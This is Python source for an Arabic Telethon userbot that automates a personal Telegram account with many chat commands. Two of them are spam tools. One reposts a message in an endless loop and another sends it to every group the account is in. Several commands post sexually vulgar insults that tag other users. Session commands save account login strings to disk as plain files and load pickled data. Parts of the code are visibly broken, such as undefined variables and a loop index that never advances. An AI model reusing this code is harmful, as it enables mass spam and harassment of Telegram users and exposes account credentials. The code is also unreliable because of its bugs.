@client.on(events.NewMessage(outgoing=True, pattern=".برع$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/5/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : تف يله برع برع ⎙",parse_mode="html")
  await joker313.delete()

import asyncio
import datetime as dt
import platform
import time
import os
from ping3 import ping

# متغيرات لتخزين كليشة الفحص ومسار الصورة
check_message = """
┏───────────────┓
│● ɴᴀᴍᴇ ➪  {mention}
│● telethon ➪ {telethon_ver}
│● ᴘʏᴛʜᴏɴ ➪ {python_version}
│● ᴘɪɴɢ ➪ {ping_result}
│● ᴜᴘ ᴛɪᴍᴇ ➪ {uptime}
│● sᴇᴛᴜᴘ ᴅᴀᴛᴀ ➪ {setup_date_str}
┗───────────────┛
"""
check_image_path = None  # تخزين مسار الصورة

# أمر الفحص
@client.on(events.NewMessage(from_users='me', pattern='.فحص'))
async def send_welcome_message(event):
    global check_message, check_image_path
    event = await event.edit("جـارِ المعـالجه ...")
    await asyncio.sleep(1)

    current_time = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    uptime = current_time.strftime('%H:%M')
    python_version = platform.python_version()
    telethon_ver = telethon.__version__
    setup_date = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    setup_date_str = setup_date.strftime('%Y-%m-%d %H:%M')

    try:
        ping_time = ping("8.8.8.8", unit="ms")
        ping_result = f"{ping_time:.2f} ms" if ping_time is not None else "تعذر الحساب"
    except Exception:
        ping_result = "تعذر الحساب"

    mention = event.sender.username if event.sender and event.sender.username else ""
    user_id = event.sender_id

    # تحديث البيانات في الكليشة
    message = check_message.format(
        mention=mention, python_version=python_version, 
        telethon_ver=telethon_ver, uptime=uptime,
        ping_result=ping_result, setup_date_str=setup_date_str, 
        user_id=user_id
    )

    # إرسال الصورة مع الكليشة (إن وجدت)
    if check_image_path and os.path.exists(check_image_path):
        await client.send_file(event.chat_id, check_image_path, caption=message, reply_to=event.id)
        await event.delete()
    else:
        await event.edit(message)

# أمر لتحديث كليشة الفحص بالرد على رسالة
@client.on(events.NewMessage(from_users='me', pattern='.تعيين كليشة الفحص'))
async def update_check_message(event):
    global check_message
    
    # التحقق مما إذا كان هناك رد
    if not event.reply_to_msg_id:
        await event.edit("**⎙ يجب الرد على رسالة تحتوي على الكليشة الجديدة.**")
        return
    
    # الحصول على الرسالة التي تم الرد عليها
    reply_message = await event.get_reply_message()
    
    if not reply_message.text:
        await event.edit("**⎙ يجب أن يكون الرد على رسالة نصية.**")
        return

    check_message = reply_message.text
    await event.edit("**⎙ تم تحديث كليشة الفحص بنجاح!**")

# أمر لتعيين صورة الفحص بالرد على صورة
@client.on(events.NewMessage(from_users='me', pattern='.تعيين صورة الفحص'))
async def set_check_image(event):
    global check_image_path
    
    # التحقق مما إذا كان هناك رد
    if not event.reply_to_msg_id:
        await event.edit("**⎙ يجب الرد على رسالة تحتوي على الصورة الجديدة.**")
        return

    # الحصول على الرسالة التي تم الرد عليها
    reply_message = await event.get_reply_message()

    if not reply_message.media:
        await event.edit("**⎙ يجب الرد على صورة وليس على رسالة نصية.**")
        return

    # تحميل الصورة وحفظها
    file_path = await reply_message.download_media()
    check_image_path = file_path

    await event.edit("**⎙ تم تعيين صورة الفحص بنجاح!**")

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.سوبر (\d+)$"))
async def final_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("**▪︎|يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا.**", parse_mode="md")
    finalll = event.client
    global final
    final = True
    await final_supernshr(finalll, sleeptimet, message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.بلش (\d+)$"))
async def repeat_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎|يجب الرد على رسالة لاستخدام هذا الامر.**", parse_mode="md")

    global final
    final = True

    while final:
        await message.respond(message)
        await asyncio.sleep(seconds)
        
    
@client.on(events.NewMessage(outgoing=True, pattern=r"^\.تناوب (\d+)$"))
async def rotate_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎|يجب الرد على رسالة لاستخدام هذا الامر.**", parse_mode="md")

    global final
    final = True
    chats = await finalll.get_dialogs()
    groups = [chat for chat in chats if chat.is_group]
    num_groups = len(groups)
    current_group_index = 0

    while final:
        try:
            if message.media:
                await finalll.send_file(groups[current_group_index].id, message.media, caption=message.text)
            else:
                await finalll.send_message(groups[current_group_index].id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {groups[current_group_index].id}: {e}")

@events.register(events.NewMessage(pattern="\.gym$", outgoing=True))
async def gym(event):
    if event.fwd_from:
        return
    deq = deque(list("🏃‍🏋‍🤸‍🏃‍🏋‍🤸‍🏃‍🏋‍🤸‍"))
    for _ in range(48):
        await asyncio.sleep(0.1)
        await event.edit("".join(deq))
        deq.rotate(1)

pattern = r"^test(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))
async def handler(event):
    tr = translate("انا عراقي", lang_tgt="fa").replace("\ N", "\n")
    await edit_or_reply(event, tr)
    result = await l313l(functions.users.GetFullUserRequest(
        id='earthlink_telecommunications'
    ))
    await event.reply(result.stringify())



pattern = r"^تكلم(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))

async def handler(event):

    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    start = datetime.now()
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        text = previous_message.message
        lan = input_str

    elif "|" in input_str:
        lan, text = input_str.split("|")

    else:

        await edit_or_reply(event, "- هذا نص غير صحيح")
        return
        text = text.strip()
        lan = lan.strip()

    HuReevent = await edit_or_reply(event, "⌔∮ جـار التسجيل انتـظر قليلا")


    if not os.path.isdir("./temp/"):

        os.makedirs("./temp/")

    required_file_name = "./temp/" + "voice.ogg"

    try:

        tts = gTTS(text, lang=lan)
        tts.save(required_file_name)
        command_to_execute = [
            "ffmpeg",
            "-i",
             required_file_name,
             "-map",
             "0:a",
             "-codec:a",
             "libopus",
             "-b:a",
             "100k",
             "-vbr",
             "on",
             required_file_name + ".opus"
        ]
        
        try:

            t_response = subprocess.check_output(

                command_to_execute, stderr=subprocess.STDOUT

            )

        except (subprocess.CalledProcessError, NameError, FileNotFoundError) as exc:

            await HuReevent.edit(str(exc))

        else:

            os.remove(required_file_name)

            required_file_name = required_file_name + ".opus"

        end = datetime.now()

        ms = (end - start).seconds

        await event.client.send_file(

            event.chat_id,

            required_file_name,

            reply_to=event.message.reply_to_msg_id,

            allow_cache=False,

            voice_note=True,

        )

        os.remove(required_file_name)

        await edit_delete(

            HuReevent,

            "تحويل النص {} الى مقطع صوتي في {} ثواني ".format(text[0:20], ms),

        )

    except Exception as e:

        await edit_or_reply(HuReevent, f"خطأ:\n{e}")


phone_number_pending = None
phone_code_hash_pending = None
new_client = None

def get_session_filename(phone_number):
    return f'session_{phone_number}.pkl'

def load_or_create_session(phone_number, session_file=None):
    if session_file:
        try:
            with open(session_file, 'rb') as f:
                string = pickle.load(f)
            client = TelegramClient(StringSession(string), api_id, api_hash)
            print(f"\033[032mSession loaded from {session_file} successfully!")
            return client
        except FileNotFoundError:
            print(f"\033[031mSession file not found: {session_file}")
            return None
        except Exception as e:
            print(f"\033[031mError loading session from {session_file}: {e}")
            return None
    else:
        filename = get_session_filename(phone_number)
        try:
            with open(filename, 'rb') as f:
                string = pickle.load(f)
            client = TelegramClient(StringSession(string), api_id, api_hash)
            print(f"\033[032mSession for {phone_number} loaded successfully!")
            return client
        except FileNotFoundError:
            return None

def save_session(client, phone_number):
    session = client.session.save()
    with open(f"{phone_number}.session", "w") as file:
        file.write(session)
    print(f"\033[032mSession for {phone_number} saved successfully!")

accounts = {}

@client.on(events.NewMessage(outgoing=True, pattern=r"\.جلسة (.+)$"))
async def add_session(event):
    global accounts
    phone_number = event.pattern_match.group(1)
    if phone_number not in accounts:
        accounts[phone_number] = {}
        client = load_or_create_session(phone_number)
        if client is None:
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
        accounts[phone_number]['client'] = client
    try:
        sent_code = await accounts[phone_number]['client'].send_code_request(phone_number)
        await event.respond(f'**▪︎|تم إرسال الكود. الرجاء إرسال الكود باستخدام الأمر `.رمز <الكود>` (مع مسافة بين الأرقام)**', parse_mode="markdown")
    except Exception as e:
        await event.respond(f'**▪︎|حدث خطأ أثناء إرسال الكود: {e}**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.رمز (.+)$"))
async def add_code(event):
    global accounts
    phone_number = None
    for account in accounts:
        if accounts[account]['client'].is_user_authorized():
            phone_number = account
            break
    if phone_number is not None:
        code = event.pattern_match.group(1).replace(" ", "")
        try:
            await accounts[phone_number]['client'].sign_in(phone_number, code)
            save_session(accounts[phone_number]['client'], phone_number)
            await event.respond(f'**▪︎|تمت إضافة الجلسة لرقم الهاتف {phone_number} بنجاح✅️**', parse_mode="markdown")
        except SessionPasswordNeededError:
            await event.respond('**▪︎|يتطلب هذا الحساب تحقق بخطوتين. الرجاء إرسال كلمة المرور باستخدام الأمر `.تحقق <كلمة المرور>`**', parse_mode="markdown")
        except Exception as e:
            await event.respond(f'**▪︎|حدث خطأ أثناء إضافة الجلسة: {e}**', parse_mode="markdown")
    else:
        await event.respond('**▪︎|الرجاء إرسال رقم الهاتف أولاً باستخدام الأمر `.جلسة <رقم الهاتف>`**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.تحقق (.+)$"))
async def add_password(event):
    global accounts
    phone_number = event.pattern_match.group(1)
    if phone_number in accounts:
        password = event.pattern_match.group(1)
        try:
            await accounts[phone_number]['client'].sign_in(phone_number, password=password)
            save_session(accounts[phone_number]['client'], phone_number)
            await event.respond(f'**▪︎|تمت إضافة الجلسة لرقم الهاتف {phone_number} بنجاح✅️**', parse_mode="markdown")
        except Exception as e:
            await event.respond(f'**▪︎|حدث خطأ أثناء إضافة الجلسة: {e}**', parse_mode="markdown")
    else:
        await event.respond('**▪︎|الرجاء إرسال رقم الهاتف أولاً باستخدام الأمر `.جلسة <رقم الهاتف>`**', parse_mode="markdown")
        
@client.on(events.NewMessage(outgoing=True, pattern=r'^\.طباعة (.+)'))
async def ple(event):
    orig_text = event.pattern_match.group(1)
    text = orig_text
    pb = ""
    typing_symbol = "▒"
    while(pb != orig_text):
        try:
            await event.edit(pb + typing_symbol)
            time.sleep(0.05)
            pb += text[0]
            text = text[1:]
            await event.edit(pb)
            time.sleep(0.05)
        except Exception as e:
            print(e)

@client.on(events.NewMessage(outgoing=True, pattern=r"\.شرطة$"))
async def police(event):
    if event.fwd_from:
        return
    animation_ttl = range(0, 12)
    await event.edit("Police")
    animation_chars = [
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        " **Police iz Here**",
    ]
    for i in animation_ttl:
        await asyncio.sleep(0.5)
        await event.edit(animation_chars[i % 12])

@client.on(events.NewMessage(outgoing=True, pattern=r'\.تشفير$'))
async def runb64(event):
    await event.edit("wait...")
    options = event.message.raw_text.split()
    selectsecretmessage = await event.get_reply_message()
    try:
        if options[1] == "en":
            secretmessage = selectsecretmessage.message
            secretmessagebytes = secretmessage.encode("ascii")
            encodesecretmessage = base64.b64encode(secretmessagebytes)
            encodesecretmessagebytes = encodesecretmessage.decode("ascii")
            await event.edit("التشفير...")
            sleep(2)
            await event.edit(f"{encodesecretmessagebytes}")
        elif options[1] == "de":
            secretkey = selectsecretmessage.message
            secretkeybytes = secretkey.encode("ascii")
            decodesecretkey = base64.b64decode(secretkeybytes)
            decodesecretkeybytes = decodesecretkey.decode("ascii")
            await event.edit("فك التشفير...")
            sleep(2)
            await event.edit(f"الرسالة المفككة: {decodesecretkeybytes}")
        else:
            await event.edit("خطأ!!!")
    except IndexError:
        await event.edit("لكتابة ترميز او فك الترميز اكتب .تشفير بالرد على الرسالة")
    except:
        await event.edit("بعض الاخطاء!!!") 

@client.on(events.NewMessage(pattern="^/purge"))
async def purge(event):
    chat = event.chat_id
    msgs = []

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.edit("انـت لسـت ادمـن!")
        return

    msg = await event.get_reply_message()
    if not msg:
        await event.edit("قـم بالـرد على الـرسالة التـي تريـد حذف الـرسائل التـي تحـتها.")
        return

    try:
        msg_id = msg.id
        count = 0
        to_delete = event.message.id - 1
        await tgbot.delete_messages(chat, event.message.id)
        msgs.append(event.reply_to_msg_id)
        for m_id in range(to_delete, msg_id - 1, -1):
            msgs.append(m_id)
            count += 1
            if len(msgs) == 100:
                await tgbot.delete_messages(chat, msgs)
                msgs = []

        await tgbot.delete_messages(chat, msgs)
        del_res = await event.client(
            event.chat_id, f"تنظيف سريع {count} رسالة ."
        )

        await asyncio.sleep(4)
        await del_res.delete()

    except MessageDeleteForbiddenError:
        text = "خـطأ في حـذف الـرسائل.\n"
        text += "الـرساله قد تكون قديمة او ليسـت لديـك صلاحـيات الـحذف"
        del_res = await event.reply(text, parse_mode="md")
        await asyncio.sleep(5)
        await del_res.delete()


@client.on(events.NewMessage(pattern="^/del$"))
async def delete_msg(event):

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.edit("انـت لـست ادمـن!")
        return

    chat = event.chat_id
    msg = await event.get_reply_message()
    if not msg:
        await event.edit("قـم بالـرد على الـرسالة التـي تريـد حذف الـرسائل التـي تحـتها")
        return
    to_delete = event.message
    chat = await event.get_input_chat()
    rm = [msg, to_delete]
    await tgbot.delete_messages(chat, rm)

@client.on(events.NewMessage(pattern=".رفع جلب(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    # إذا كان المستخدم هو المطور، أرسل رسالة معينة وتوقف عن التنفيذ
    if user.id == 7915484613:
        await event.edit("**- لكك دي هذا المطور**")
        return
        
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**⎙︙ المستخدم** [{JoKeRUB}](tg://user?id={user.id})\n**⎙︙ تم رفعه جلب 🐶 بواسطة :** {my_mention}\n**⎙︙ خليه خله ينبح 😂**")

@client.on(events.NewMessage(pattern="زواج(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    # إذا كان المستخدم هو المطور، أرسل رسالة معينة وتوقف عن التنفيذ
    if user.id == 7915484613:
        await event.edit("**- لكك دي هذا المطور**")
        return
        
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    await event.edit(f"⎙︙ لقد تم زواجك/ج من 💍\n⎙︙ الف الف مبروك! الآن يمكنك أخذ راحتك 😍")
    
@client.on(events.NewMessage(pattern=".رفع ابن قحبة(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    # إذا كان المستخدم هو المطور، أرسل رسالة معينة وتوقف عن التنفيذ
    if user.id == 7915484613:
        await event.edit("**- لكك دي هذا المطور**")
        return
        
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**⎙︙ المستخدم** [{JoKeRUB}](tg://user?id={user.id})\n**⎙︙ تم رفعه ابن قحبة 🖕 بواسطة :** {my_mention}\n**⎙︙ خليه يرضع من زبك 😂**")    
    
@client.on(events.NewMessage(pattern=".رفع مرتي(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    # إذا كان المستخدم هو المطور، أرسل رسالة معينة وتوقف عن التنفيذ
    if user.id == 7915484613:
        await event.edit("**- لكك دي هذا المطور**")
        return
        
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"🚻 **⎙︙ المستخدم => •** [{JoKeRUB}](tg://user?id={user.id})\n☑️ **⎙︙ تم رفعها مرتك بواسطة :** {my_mention} 👰🏼‍♀️.\n**⎙︙ يلا حبيبي امشي نخلف بيبي 👶🏻🤤**")

@client.on(events.NewMessage(pattern="كتابة(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع الكتابة الوهمية لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(t)

@client.on(events.NewMessage(pattern="الرابط$"))
async def _(e):
    rr = await e.reply("**يتم جلب الرابط، انتظر...**")
    try:
        r = await e.client(ExportChatInviteRequest(e.chat_id))
        await rr.edit(f"- رابط الدردشة:\n {r.link}")
    except errors.ChatAdminRequiredError:
        await rr.edit("عذراً، يجب أن تكون مشرفًا للحصول على رابط الدعوة.")
        
HuRe_Bosa = ["روح لعند المطور وقول له", "ايع مقرف", "همممممم"]

@client.on(events.NewMessage(pattern=".بوسة$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_Bosa))

DevJoker = [7915484613]

HuRe_5erok = [
    "** ‎لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",
    "** لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ **",
    "** هل كذبت على والديك من قبل..؟ **",
    "** لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ **",
    "** لو خيروك |  بين أستاذ اللغة  ية أو أستاذ الرياضيات؟ **",
    "** تحس انك محظوظ بالاشخاص الي حولك ؟ **",
    "** لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ **",
    "** لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ **",
    "** لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ **",
    "** لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ **",
    "** لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ **",
    "** لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ **",
    "** لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ **",
    "** لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ **",
    "** لو خيروك |  بين رجل أعمال أو أمير؟ **",
    "** لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ **",
    "** لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ **",
    "** لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ **",
    "** لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟! **",
    "** لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ **",
    "** لو خيروك |  بين زوجتك وابنك/ابنتك؟ **",
    "** لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ **",
    "** لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ **",
    "** لو خيروك |  بين أمك وأبيك؟ **",
    "** لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ **",
    "** لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ **",
    "** لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",

]


@client.on(events.NewMessage(pattern=".خيروك$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_5erok))

@client.on(events.NewMessage(pattern="صوتية(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع ارسال الصوتية الوهمية لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "record-audio"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="فيد(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع ارسال الفيديو الوهمي لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "record-video"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="لعبة(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع اللعب الوهمي لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "game"):
        await asyncio.sleep(t)

translator = Translator()

tr_status = {}

@client.on(events.NewMessage(outgoing=True, pattern=".مترجم (.*)"))
async def start_translate(event):
    if event.fwd_from:
        return
    lang = event.pattern_match.group(1).strip()
    chat_id = event.chat_id
    tr_status[chat_id] = lang
    await event.edit(f"**تم تفعيل المترجم إلى اللغة: {lang}**", parse_mode="md")

@client.on(events.NewMessage)
async def auto_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        lang = tr_status[chat_id]
        try:
            translated = await translator.translate(event.message.message, dest=lang)
            await event.edit(translated.text, parse_mode="md")
        except Exception as exc:
            print(f"خطأ في الترجمة: {exc}")

@client.on(events.NewMessage(outgoing=True, pattern='.ايقاف النشر'))
async def stop_final(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    global final
    final = False
    await event.edit("**▪︎|تم ايقاف النشر التلقائي بنجاح.**", parse_mode="md")

update_tasks = {}
time_formats = {
    "1": "𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝟎",
    "2": "𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶",
    "3": "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢",
    "4": "𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵𝟬",
    "5": "𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿𝟶",
    "6": "۱۲۳۴۵۶۷۸۹۰",
    "7": "١٢٣٤٥٦٧٨٩٠",
    "8": "₁₂₃₄₅₆₇₈₉₀",
    "9": "⓵⓶⓷⓸⓹⓺⓻⓼⓽⓪",
    "10": "𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝟘",
    "11": "❶❷❸❹❺❻❼❽❾⓿"
}

current_time_format = "1"

async def update_name_periodically(event, user_name, timezone_str): 
    chat_id = event.chat_id
    timezone = pytz.timezone(timezone_str)  
    await event.delete() 
    while True:
        now = datetime.now(timezone)
        formatted_time = now.strftime('%I:%M')
        original_chars = "1234567890"
        formatted_chars = time_formats[current_time_format]
        for i in range(len(original_chars)):
            formatted_time = formatted_time.replace(original_chars[i], formatted_chars[i])
        try:
            await event.client(UpdateProfileRequest(last_name=formatted_time)) 
        except Exception as ex:
            print(f"حدث خطأ: {str(ex)}")
        await asyncio.sleep(55)
        if chat_id in update_tasks and not update_tasks[chat_id]:
            break

@client.on(events.NewMessage(pattern=r"\.اسمي \| (.+)", outgoing=True))
async def change_name_with_time(event):
    timezone_str = event.pattern_match.group(1) 
    chat_id = event.chat_id
    update_tasks[chat_id] = True
    me = await client.get_me()
    user_name = me.first_name
    asyncio.ensure_future(update_name_periodically(event, user_name, timezone_str))

@client.on(events.NewMessage(pattern=r"\.ايقاف اسمي$", outgoing=True))
async def stop_name_update(event):
    chat_id = event.chat_id
    if chat_id in update_tasks:
        update_tasks[chat_id] = False
        try:
            await event.client(UpdateProfileRequest(last_name="")) 
        except Exception as ex:
            print(f"حدث خطأ: {str(ex)}")
        await event.delete() 

@client.on(events.NewMessage(pattern=r"\.الاشكال$", outgoing=True))
async def show_time_formats(event):
    formats_text = "\n".join([f"{key}: {value}" for key, value in time_formats.items()])
    await event.respond(f"**اختار اي نوع من هاي الاشكال الي تعجبك:**\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r"\.الشكل (\d+)", outgoing=True))
async def change_time_format(event):
    global current_time_format
    try:
        format_key = event.pattern_match.group(1)
        if format_key in time_formats:
            current_time_format = format_key
            await event.respond(f"تم تغيير شكل الوقت إلى {format_key}")
        else:
            await event.respond("شكل الوقت غير موجود.")
    except Exception as e:
        print(f"حدث خطأ: {str(e)}")
    await event.delete()

 
@client.on(events.NewMessage(pattern="طلاك(?:\s|$)([\s\S]*)"))
async def permalink(event):
    mention = await event.get_reply_message()
    user = await get_user_from_event(event)
    
    if not user:
        return

    # إذا كان المستخدم هو المطور، أرسل رسالة معينة وتوقف عن التنفيذ
    if user.id == 7915484613:
        await event.respond("**- لكك دي هذا المطور**")
        return

    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    
    await edit_or_reply(event, f"**⎙︙ انتِ طالق طالق طالق 🙎🏻‍♂️ من :** {my_mention} .\n**⎙︙ لقد تم طلاقها بالثلاث وفسخ زواجكما، الآن الكل حر طليق.**")              
           
@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.فاك$"))
async def fuck(event):
	await event.edit("┏━┳┳┳━┳┳┓\n┃━┫┃┃┏┫━┫┏┓\n┃┏┫┃┃┗┫┃┃┃┃\n┗┛┗━┻━┻┻┛┃┃\n┏┳┳━┳┳┳┓┏┫┣┳┓\n┣┓┃┃┃┃┣┫┃┏┻┻┫\n┃┃┃┃┃┃┃┃┣┻┫┃┃\n┗━┻━┻━┻┛┗━━━┛")

@client.on(events.NewMessage(outgoing=True,  pattern=r"^\.ابره$"))
async def fuck(event):
	await event.edit(f"────▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀█─█\n▀▀▀▀▄─█─█─█─█─█─█──█▀█\n─────▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀─▀\n\n")
	

c = requests.session()
bot_username = '@EEObot'
bot_username2 = '@A_MAN9300BOT'
bot_username3 = '@MARKTEBOT'
